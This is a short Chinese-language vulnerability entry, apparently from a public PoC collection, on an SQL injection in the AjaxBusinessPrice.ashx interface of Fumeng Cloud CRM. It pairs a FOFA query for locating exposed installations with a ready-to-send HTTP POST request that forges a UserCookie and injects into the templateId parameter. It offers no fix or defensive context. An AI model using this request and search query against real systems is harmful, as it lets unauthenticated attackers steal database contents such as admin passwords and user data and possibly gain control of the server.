## 孚盟云CRM-AjaxBusinessPrice.ashx-SQL注入漏洞

## 一、漏洞简介
上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxBusinessPrice.ashx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限

## fofa
```
app="孚盟软件-孚盟云"
```

## POC
```
POST /m/Dingding/Ajax/AjaxBusinessPrice.ashx HTTP/1.1
Host: 1
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=ImportBusinessPriceFiles&templateId='SQLI_POC&Fid=1&type=1
```
